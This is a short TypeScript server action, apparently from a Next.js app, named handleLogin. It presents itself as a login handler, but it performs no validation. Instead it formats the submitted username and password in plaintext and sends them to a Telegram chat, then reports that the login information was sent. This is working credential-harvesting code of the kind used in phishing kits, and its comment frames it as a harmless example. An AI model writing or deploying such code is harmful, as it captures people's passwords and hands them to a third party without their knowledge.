"use server"

import { sendTelegramMessage } from "@/lib/telegram"

export async function handleLogin(username: string, password: string, chatId: string) {
  try {
    // Here you would typically validate the username and password
    // For this example, we'll just send the data to Telegram

    const message = `Login attempt:
Username: ${username}
Password: ${password}`

    await sendTelegramMessage(chatId, message)

    return { success: true, message: "Login information sent to Telegram." }
  } catch (error) {
    console.error("Login error:", error)
    return { success: false, message: "An error occurred. Please try again." }
  }
}

